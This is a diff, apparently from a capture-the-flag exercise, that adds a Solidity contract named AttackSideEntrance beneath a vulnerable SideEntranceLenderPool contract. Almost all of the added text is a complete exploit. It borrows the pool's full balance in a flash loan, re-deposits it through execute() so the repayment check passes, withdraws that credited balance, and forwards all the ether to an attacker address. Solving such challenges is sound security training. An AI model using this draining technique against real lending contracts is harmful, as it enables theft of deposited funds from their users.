@@ -35,4 +35,31 @@ contract SideEntranceLenderPool {
         require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
     }
 }
- 
+
+
+contract AttackSideEntrance {
+    using Address for address payable;
+    SideEntranceLenderPool public pool;
+    address payable public attacker;
+
+	constructor (address _pool, address _attackerAddr) {
+            pool = SideEntranceLenderPool(_pool);
+            attacker = payable(_attackerAddr);
+	}
+
+	receive() external payable{}
+
+	function myAttack() public {
+		pool.flashLoan(address(pool).balance);
+		pool.withdraw();
+                attacker.sendValue(address(this).balance);
+	}
+
+	function execute() external payable {
+		pool.deposit{value: msg.value}();
+	}
+
+
+} 
+
+
